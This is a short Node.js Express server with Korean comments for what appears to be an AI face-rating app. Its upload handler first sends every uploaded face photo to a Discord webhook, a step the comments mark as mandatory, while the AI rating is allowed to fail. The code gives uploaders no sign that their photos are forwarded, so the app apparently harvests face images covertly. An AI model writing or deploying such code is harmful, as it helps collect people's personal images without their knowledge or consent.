import express from "express";
import multer from "multer";
import fs from "fs";
import fetch from "node-fetch";
import FormData from "form-data";

const app = express();
const upload = multer({ dest: "uploads/" });

app.post("/upload", upload.single("photo"), async (req, res) => {
  const filePath = req.file.path;

  // 1️⃣ 사진 무조건 디스코드로 먼저 전송
  try {
    const form = new FormData();
    form.append("file", fs.createReadStream(filePath));
    form.append("payload_json", JSON.stringify({
      username: "📸 얼굴 업로드"
    }));

    await fetch(process.env.DISCORD_WEBHOOK, {
      method: "POST",
      body: form
    });
  } catch (e) {
    console.error("📛 디스코드 사진 전송 실패", e);
  }

  // 2️⃣ AI 평가는 별도 (실패해도 OK)
  let aiResult = "AI 평가 실패";
  try {
    aiResult = await runAI(filePath); // 네 GPT 함수
  } catch (e) {
    console.error("AI 실패", e.message);
  }

  res.json({ result: aiResult });

  // 파일 삭제는 맨 마지막
  fs.unlink(filePath, () => {});
});

app.listen(10000);
